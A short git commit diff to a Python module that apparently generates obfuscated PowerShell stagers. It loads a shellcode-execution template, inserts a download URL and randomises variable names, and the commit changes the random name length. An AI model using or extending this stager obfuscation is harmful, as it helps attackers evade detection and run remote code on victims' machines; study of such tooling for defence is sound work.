28162c898acd1e32fb558f21d5285a5869732c7e
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2017-09-28 10:42:55 -0400

    Update ps.py

--- module/ps.py
+++ module/ps.py
@@ -23,7 +23,7 @@ class PsModule(ModuleObject):
         if self.vars["rand"][0].lower() == "true" or True:
             stage1 = self.load_file("core/util/exec-sc-rand.ps1").replace("[URL]", self.vars["url"][0])
             for i in reversed(range(1, 12)):
-                stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(5, 25)))
+                stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(3, 10)))
 			
         path = self.write_file(stage1)
         stage1 = self.read_file(path).replace("A", "!")
